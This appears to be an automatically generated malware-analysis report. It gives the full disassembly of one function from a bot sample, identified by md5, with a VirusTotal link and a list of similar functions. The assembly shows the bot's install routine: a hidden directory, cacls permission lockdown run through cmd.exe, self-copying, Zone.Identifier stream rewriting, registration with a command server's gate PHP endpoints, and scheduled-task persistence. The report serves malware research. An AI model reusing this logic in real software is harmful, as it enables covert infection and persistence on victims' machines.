---
layout: post
title:  "fcn.00406b6f @ 69b3c79878674ea715338a112bb5caa6"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** fcn.00406b6f
- **Origin (md5):** 69b3c79878674ea715338a112bb5caa6
- **VirusTotal:** [virustotal.com/gui/file/69b3c79878674ea715338a112bb5caa6][virustotal_ref]

# Code Tags
<span class="tag" id="FILE">FILE</span>


# Similar Functions

1. [fcn.1000a104][similar_1_ref] (sim.: 0.9221635057279932)
2. [fcn.004172d1][similar_2_ref] (sim.: 0.9115007646054525)
3. [fcn.0043883a][similar_3_ref] (sim.: 0.9094836769343138)
4. [fcn.0040495d][similar_4_ref] (sim.: 0.9085128129756657)
5. [fcn.00420823][similar_5_ref] (sim.: 0.9052206712820934)


# Disassembled Code

{% highlight nasm %}
push 0x4a8
mov eax,0x42442b
call fcn.0041ef59
xor ebx,ebx
push 0x103
lea eax,[ebp-0x113]
push ebx
push eax
mov byte[ebp-0x114],bl
call fcn.00411550
add esp,0xc
push 0x104
lea eax,[ebp-0x114]
push eax
push ebx
call dword[sym.imp.KERNEL32.dll_GetModuleFileNameA]
push 0xc
lea ecx,[ebp-0x14c]
call fcn.00409e13
mov dword[ebp-0x468],eax
push 4
lea ecx,[ebp-0x168]
mov dword[ebp-4],ebx
call fcn.00409e13
mov dword[ebp-0x46c],eax
push 4
lea ecx,[ebp-0x248]
mov byte[ebp-4],1
call fcn.00409e13
mov edi,eax
push 8
lea ecx,[ebp-0x2b8]
mov byte[ebp-4],2
call fcn.00409e13
push eax
lea eax,[ebp-0x29c]
push 0x42869c
push eax
mov byte[ebp-4],3
call fcn.004029ac
mov esi,0x428698
push esi
push eax
lea eax,[ebp-0x280]
push eax
mov byte[ebp-4],4
call fcn.004029e3
mov ecx,eax
mov eax,edi
lea edi,[ebp-0x22c]
mov byte[ebp-4],5
call fcn.00402a1a
push esi
push eax
lea eax,[ebp-0x2f0]
push eax
mov byte[ebp-4],6
call fcn.004029e3
mov ecx,eax
mov eax,dword[ebp-0x46c]
lea edi,[ebp-0x30c]
mov byte[ebp-4],7
call fcn.00402a1a
push esi
push eax
lea eax,[ebp-0x2d4]
push eax
mov byte[ebp-4],8
call fcn.004029e3
mov ecx,eax
mov eax,dword[ebp-0x468]
lea edi,[ebp-0x184]
mov byte[ebp-4],9
call fcn.00402a1a
push 0x428694
push eax
lea eax,[ebp-0x130]
push eax
mov byte[ebp-4],0xa
call fcn.004029e3
add esp,0x3c
xor esi,esi
push ebx
inc esi
push esi
mov ecx,edi
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2d4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x30c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2f0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x22c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x280]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x29c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2b8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x248]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x168]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x14c]
mov byte[ebp-4],0x16
call fcn.00401cd0
lea eax,[ebp-0x130]
push eax
lea esi,[ebp-0x328]
call fcn.004026e3
lea esi,[ebp-0x264]
mov byte[ebp-4],0x17
call fcn.00409ce7
sub esp,0x1c
mov byte[ebp-4],0x18
mov eax,esp
mov dword[ebp-0x460],esp
push str.Install___Generated_path:_
push eax
lea edi,[ebp-0x130]
call fcn.00408c43
pop ecx
pop ecx
call fcn.0040284c
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x460],esp
push str.Install___Generated_name:_
push eax
mov edi,esi
call fcn.00408c43
pop ecx
pop ecx
call fcn.0040284c
push 0x64
call dword[sym.imp.KERNEL32.dll_Sleep]
cmp dword[ebp-0x11c],0x10
mov eax,dword[ebp-0x130]
jae 0x406dbc
lea eax,[ebp-0x130]
push ebx
push eax
call dword[sym.imp.KERNEL32.dll_CreateDirectoryA]
cmp dword[ebp-0x11c],0x10
mov eax,dword[ebp-0x130]
jae 0x406dd9
lea eax,[ebp-0x130]
push 6
push eax
call dword[sym.imp.KERNEL32.dll_SetFileAttributesA]
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x460],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Install___Directory_created
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
lea eax,[ebp-0x168]
push str._c_echo_YCACLS__
push eax
lea edi,[ebp-0x130]
call fcn.00408c43
push str.___P___USERNAME_:R_
push eax
lea eax,[ebp-0x14c]
push eax
mov byte[ebp-4],0x19
call fcn.004029e3
add esp,0x14
cmp dword[eax+0x14],0x10
jb 0x406e3f
mov eax,dword[eax]
push ebx
push ebx
push eax
push str.cmd.exe
push ebx
push ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteA]
push ebx
push 1
lea ecx,[ebp-0x14c]
call fcn.00401cd0
push ebx
push 1
lea ecx,[ebp-0x168]
mov byte[ebp-4],0x18
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x460],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Install___Successful_protect_bot_directory
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
lea eax,[ebp-0x168]
push 0x428710
push eax
lea ecx,[ebp-0x130]
call fcn.00408cb4
lea ecx,[ebp-0x264]
push ecx
lea ecx,[ebp-0x14c]
push ecx
mov ecx,eax
mov byte[ebp-4],0x1a
call fcn.00402a68
add esp,0x10
mov esi,eax
lea edi,[ebp-0x130]
mov byte[ebp-4],0x1b
call fcn.00401c6b
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x14c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x168]
mov byte[ebp-4],0x18
call fcn.00401cd0
cmp dword[ebp-0x11c],0x10
mov eax,dword[ebp-0x130]
jae 0x406f07
mov eax,edi
push esi
push eax
lea eax,[ebp-0x114]
push eax
call dword[sym.imp.KERNEL32.dll_CopyFileA]
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x460],esp
push str.Install___Bot_copy_to_
push eax
lea edi,[ebp-0x130]
call fcn.00408c43
pop ecx
pop ecx
call fcn.0040284c
lea eax,[ebp-0x168]
push str._c_echo_YCACLS__
push eax
call fcn.00408c43
push str.___P___USERNAME_:R_
push eax
lea eax,[ebp-0x14c]
push eax
mov byte[ebp-4],0x1c
call fcn.004029e3
add esp,0x14
cmp dword[eax+0x14],0x10
jb 0x406f6b
mov eax,dword[eax]
push ebx
push ebx
push eax
push str.cmd.exe
push ebx
push ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteA]
push ebx
push esi
lea ecx,[ebp-0x14c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x168]
mov byte[ebp-4],0x18
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x460],esp
push 0xf
pop edi
mov dword[ecx+0x14],edi
mov dword[ecx+0x10],ebx
push str.Install___Successful_protect_bot_file
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
push 0x17
push str._ZoneTransfer__nZoneId2
lea ecx,[ebp-0x184]
mov dword[ebp-0x170],edi
mov dword[ebp-0x174],ebx
mov byte[ebp-0x184],bl
call fcn.00401ecb
lea eax,[ebp-0x14c]
push str.:Zone.Identifier
push eax
lea ecx,[ebp-0x130]
mov byte[ebp-4],0x1d
call fcn.00408cb4
pop ecx
pop ecx
lea ecx,[ebp-0x184]
mov edx,eax
mov byte[ebp-4],0x1e
call fcn.0040a3ca
push ebx
push esi
lea ecx,[ebp-0x14c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x184]
mov byte[ebp-4],0x18
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x460],esp
mov dword[ecx+0x14],edi
mov dword[ecx+0x10],ebx
push str.Install___Rewriting_NTFS_flow
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x460],esp
mov dword[ecx+0x14],edi
mov dword[ecx+0x10],ebx
push str.Install___Registration_bot_on_server...
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ecx+0x14],edi
mov dword[ecx+0x10],ebx
mov dword[ebp-0x464],esp
mov byte[ecx],bl
push str.POST
call fcn.00401caf
lea esi,[ebp-0x1a0]
mov byte[ebp-4],0x1f
call fcn.00409711
mov dword[ebp-0x460],eax
lea ebx,[ebp-0x1f4]
mov byte[ebp-4],0x20
call fcn.00409483
mov ebx,eax
lea esi,[ebp-0x210]
mov byte[ebp-4],0x21
call fcn.00409528
mov dword[ebp-0x474],eax
lea esi,[ebp-0x1d8]
mov byte[ebp-4],0x22
call fcn.004096c6
mov dword[ebp-0x470],eax
lea esi,[ebp-0x1bc]
mov byte[ebp-4],0x23
call fcn.004095f7
mov dword[ebp-0x478],eax
lea esi,[ebp-0x3b4]
mov byte[ebp-4],0x24
call fcn.004031ef
mov dword[ebp-0x46c],eax
lea esi,[ebp-0x37c]
mov byte[ebp-4],0x25
call fcn.00403214
mov dword[ebp-0x468],eax
lea esi,[ebp-0x360]
mov byte[ebp-4],0x26
call fcn.0040940d
mov edi,eax
lea esi,[ebp-0x424]
mov byte[ebp-4],0x27
call fcn.0040933e
push eax
lea eax,[ebp-0x408]
push 0x428a00
push eax
mov byte[ebp-4],0x28
call fcn.004029ac
push 0x4291c0
push eax
lea eax,[ebp-0x440]
push eax
mov byte[ebp-4],0x29
call fcn.004029e3
mov ecx,eax
mov eax,edi
lea edi,[ebp-0x45c]
mov byte[ebp-4],0x2a
call fcn.00402a1a
push 0x4291bc
push eax
lea eax,[ebp-0x3d0]
push eax
mov byte[ebp-4],0x2b
call fcn.004029e3
mov ecx,eax
mov eax,dword[ebp-0x468]
lea edi,[ebp-0x3ec]
mov byte[ebp-4],0x2c
call fcn.00402a1a
mov byte[ebp-4],0x2d
push 0x4291b8
push eax
lea eax,[ebp-0x398]
push eax
call fcn.004029e3
mov ecx,eax
mov eax,dword[ebp-0x46c]
lea edi,[ebp-0x344]
mov byte[ebp-4],0x2e
call fcn.00402a1a
push str.os
push eax
lea eax,[ebp-0x184]
push eax
mov byte[ebp-4],0x2f
call fcn.004029e3
mov ecx,eax
mov eax,dword[ebp-0x478]
lea edi,[ebp-0x2d4]
mov byte[ebp-4],0x30
call fcn.00402a1a
push str.bit
push eax
lea eax,[ebp-0x30c]
push eax
mov byte[ebp-4],0x31
call fcn.004029e3
add esp,0x48
mov ecx,eax
mov eax,dword[ebp-0x470]
lea edi,[ebp-0x2f0]
mov byte[ebp-4],0x32
call fcn.00402a1a
push str.proc
push eax
lea eax,[ebp-0x22c]
push eax
mov byte[ebp-4],0x33
call fcn.004029e3
mov ecx,eax
mov byte[ebp-4],0x34
mov eax,dword[ebp-0x474]
lea edi,[ebp-0x280]
call fcn.00402a1a
push str.video
push eax
lea eax,[ebp-0x29c]
push eax
mov byte[ebp-4],0x35
call fcn.004029e3
mov ecx,eax
mov eax,ebx
lea edi,[ebp-0x2b8]
mov byte[ebp-4],0x36
call fcn.00402a1a
push str.av
push eax
lea eax,[ebp-0x248]
push eax
mov byte[ebp-4],0x37
call fcn.004029e3
mov ecx,eax
mov byte[ebp-4],0x38
mov eax,dword[ebp-0x460]
lea edi,[ebp-0x168]
call fcn.00402a1a
add esp,8
mov byte[ebp-4],0x39
mov dword[ebp-0x460],esp
mov esi,eax
mov eax,esp
call fcn.00401b7c
sub esp,0x1c
mov ecx,esp
mov byte[ebp-4],0x3a
mov dword[ebp-0x474],esp
push 0xf
pop esi
xor ebx,ebx
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str._gate_reg.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x470],esp
push eax
mov byte[ebp-4],0x3b
call fcn.0040318d
lea ecx,[ebp-0x14c]
mov byte[ebp-4],0x55
call fcn.00401626
xor edi,edi
push ebx
inc edi
push edi
lea ecx,[ebp-0x14c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x168]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x248]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2b8]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x29c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x280]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x22c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2f0]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x30c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2d4]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x184]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x344]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x398]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x3ec]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x3d0]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x45c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x440]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x408]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x424]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x360]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x37c]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x3b4]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1bc]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1d8]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x210]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1f4]
call fcn.00401cd0
push ebx
mov byte[ebp-4],0x18
push edi
lea ecx,[ebp-0x1a0]
call fcn.00401cd0
push 0x3c
lea eax,[ebp-0x4b4]
push ebx
push eax
call fcn.00411550
mov eax,dword[ebp-0x130]
add esp,0xc
cmp dword[ebp-0x11c],0x10
mov dword[ebp-0x4b4],0x3c
mov dword[ebp-0x4b0],ebx
mov dword[ebp-0x4ac],ebx
mov dword[ebp-0x4a8],0x42891c
jae 0x4074c4
lea eax,[ebp-0x130]
mov dword[ebp-0x4a4],eax
lea eax,[ebp-0x4b4]
push eax
mov dword[ebp-0x4a0],ebx
mov dword[ebp-0x49c],ebx
mov dword[ebp-0x498],ebx
mov dword[ebp-0x494],ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteExA]
sub esp,0x1c
mov dword[ebp-0x464],esp
test eax,eax
jne 0x40751a
mov ecx,esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Install____Error__ShellExecuteEx_FALSE__goto_execute
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
jmp 0x40747d
lea eax,[ebp-0x328]
mov esi,esp
push eax
call fcn.004026e3
sub esp,0x1c
mov byte[ebp-4],0x56
lea eax,[ebp-0x130]
mov esi,esp
mov dword[ebp-0x460],esp
push eax
call fcn.004026e3
mov byte[ebp-4],0x18
call fcn.00403239
add esp,0x38
push 0x12
lea ecx,[ebp-0x1bc]
call fcn.00409e13
push eax
lea eax,[ebp-0x1d8]
push str._Create__SC_MINUTE__MO_15__TN__
push eax
mov byte[ebp-4],0x57
call fcn.004029ac
push str.___TR__
push eax
lea eax,[ebp-0x210]
push eax
mov byte[ebp-4],0x58
call fcn.004029e3
lea ecx,[ebp-0x130]
push ecx
lea ecx,[ebp-0x1f4]
push ecx
mov ecx,eax
mov byte[ebp-4],0x59
call fcn.00402a68
push str.___F
push eax
lea eax,[ebp-0x1a0]
push eax
mov byte[ebp-4],0x5a
call fcn.004029e3
add esp,0x2c
cmp dword[eax+0x14],0x10
jb 0x4075c2
mov eax,dword[eax]
push ebx
push 0x4282a0
push eax
push str.schtasks.exe
push str.open
push ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteA]
push ebx
push edi
lea ecx,[ebp-0x1a0]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1f4]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x210]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1d8]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x1bc]
mov byte[ebp-4],0x18
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x464],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Install___Successful_installed_bot
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x464],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0x5b
mov eax,esp
mov dword[ebp-0x460],esp
call fcn.00402915
lea ecx,[ebp-0x1bc]
call fcn.0040a2a1
mov edi,eax
lea esi,[ebp-0x1d8]
mov byte[ebp-4],0x5c
call fcn.0040933e
push eax
lea eax,[ebp-0x210]
push 0x428a00
push eax
mov byte[ebp-4],0x5d
call fcn.004029ac
push str.einstalll
push eax
lea eax,[ebp-0x1f4]
push eax
mov byte[ebp-4],0x5e
call fcn.004029e3
mov ecx,eax
push ecx
mov byte[ebp-4],0x5f
mov eax,edi
mov dword[ebp-0x460],esp
mov edi,esp
call fcn.00402a1a
sub esp,0x1c
mov byte[ebp-4],0x60
mov ecx,esp
mov dword[ebp-0x474],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str._gate_setOnline.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x470],esp
push eax
mov byte[ebp-4],0x61
call fcn.0040318d
lea ecx,[ebp-0x1a0]
mov byte[ebp-4],0x65
call fcn.00401626
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x1a0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1f4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x210]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1d8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1bc]
mov byte[ebp-4],0x18
call fcn.00401cd0
call fcn.00409bdc
push ebx
push esi
lea ecx,[ebp-0x264]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x328]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x130]
call fcn.00401cd0
call fcn.0041efdc
ret
{% endhighlight %}


[similar_1_ref]: /report/fcn.1000a104@a0ac129ff3ea4c0dfa9529c259a9502c
[similar_2_ref]: /report/fcn.004172d1@44e1ffcf4e71f4505c09d520fd75f1e4
[similar_3_ref]: /report/fcn.0043883a@418e0921f3a9bd4f5bc0dcc59623b5a1
[similar_4_ref]: /report/fcn.0040495d@418e0921f3a9bd4f5bc0dcc59623b5a1
[similar_5_ref]: /report/fcn.00420823@b3771987fba16f4fba07d1109ec72c76
[virustotal_ref]: https://www.virustotal.com/gui/file/69b3c79878674ea715338a112bb5caa6